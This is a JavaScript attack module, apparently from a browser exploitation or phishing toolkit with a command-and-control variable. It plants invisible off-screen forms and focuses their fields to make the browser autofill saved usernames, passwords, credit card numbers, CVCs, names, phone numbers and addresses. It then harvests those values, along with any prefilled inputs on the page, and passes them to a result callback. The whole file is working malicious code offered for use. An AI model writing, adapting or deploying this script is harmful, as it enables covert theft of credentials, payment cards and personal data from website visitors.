var C2 = location.protocol + '//' + location.host;
var CID = window.__pzCid || '';

// Create multiple invisible forms to trigger different autofill profiles
var wrap = document.createElement('div');
wrap.id = '__pzAFWrap';
wrap.setAttribute('aria-hidden', 'true');
wrap.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden;opacity:0.01;pointer-events:none;z-index:-1';

// Form 1: Login credentials
wrap.innerHTML = '<form autocomplete="on" id="__pzAF1">'
  + '<input type="text" name="username" autocomplete="username" tabindex="-1">'
  + '<input type="email" name="email" autocomplete="email" tabindex="-1">'
  + '<input type="password" name="password" autocomplete="current-password" tabindex="-1">'
  + '<input type="password" name="new-password" autocomplete="new-password" tabindex="-1">'
  + '</form>'
  // Form 2: Credit card
  + '<form autocomplete="on" id="__pzAF2">'
  + '<input type="text" name="ccname" autocomplete="cc-name" tabindex="-1">'
  + '<input type="text" name="ccnumber" autocomplete="cc-number" tabindex="-1">'
  + '<input type="text" name="ccexp" autocomplete="cc-exp" tabindex="-1">'
  + '<input type="text" name="cccsc" autocomplete="cc-csc" tabindex="-1">'
  + '<input type="text" name="cctype" autocomplete="cc-type" tabindex="-1">'
  + '</form>'
  // Form 3: Personal info
  + '<form autocomplete="on" id="__pzAF3">'
  + '<input type="text" name="name" autocomplete="name" tabindex="-1">'
  + '<input type="text" name="given-name" autocomplete="given-name" tabindex="-1">'
  + '<input type="text" name="family-name" autocomplete="family-name" tabindex="-1">'
  + '<input type="tel" name="tel" autocomplete="tel" tabindex="-1">'
  + '<input type="text" name="organization" autocomplete="organization" tabindex="-1">'
  + '<input type="text" name="title" autocomplete="organization-title" tabindex="-1">'
  + '</form>'
  // Form 4: Address
  + '<form autocomplete="on" id="__pzAF4">'
  + '<input type="text" name="street" autocomplete="street-address" tabindex="-1">'
  + '<input type="text" name="address1" autocomplete="address-line1" tabindex="-1">'
  + '<input type="text" name="address2" autocomplete="address-line2" tabindex="-1">'
  + '<input type="text" name="city" autocomplete="address-level2" tabindex="-1">'
  + '<input type="text" name="state" autocomplete="address-level1" tabindex="-1">'
  + '<input type="text" name="zip" autocomplete="postal-code" tabindex="-1">'
  + '<input type="text" name="country" autocomplete="country-name" tabindex="-1">'
  + '</form>';

document.body.appendChild(wrap);

// Trigger autofill by focusing fields briefly
var allInputs = wrap.querySelectorAll('input');
var idx = 0;
function focusNext() {
  if (idx < allInputs.length) {
    allInputs[idx].focus();
    idx++;
    setTimeout(focusNext, 50);
  } else {
    // Restore focus to body
    document.body.focus();
  }
}
focusNext();

// Harvest after autofill has had time to populate
setTimeout(function() {
  var result = {
    url: location.href,
    timestamp: new Date().toISOString(),
    credentials: {},
    credit_card: {},
    personal: {},
    address: {}
  };

  // Read all form values
  var forms = { credentials: '__pzAF1', credit_card: '__pzAF2', personal: '__pzAF3', address: '__pzAF4' };
  var hasAnything = false;

  Object.keys(forms).forEach(function(cat) {
    var form = document.getElementById(forms[cat]);
    if (!form) return;
    for (var i = 0; i < form.elements.length; i++) {
      var el = form.elements[i];
      if (el.value) {
        result[cat][el.name] = el.value;
        hasAnything = true;
      }
    }
  });

  // Also check if any existing page inputs have autofilled values
  var pageInputs = document.querySelectorAll('input:not([id^="__pzAF"])');
  var prefilled = {};
  pageInputs.forEach(function(el) {
    if (el.value && (el.type === 'password' || el.type === 'email' || el.type === 'text' || el.type === 'tel')) {
      var key = el.name || el.id || el.autocomplete || ('input_' + el.type);
      prefilled[key] = { value: el.value, type: el.type, autocomplete: el.autocomplete || '' };
      hasAnything = true;
    }
  });
  if (Object.keys(prefilled).length) result.page_prefilled = prefilled;

  result.autofill_triggered = hasAnything;

  // Cleanup
  wrap.remove();

  __pzResult(result);
}, 3000);

return '__async__';
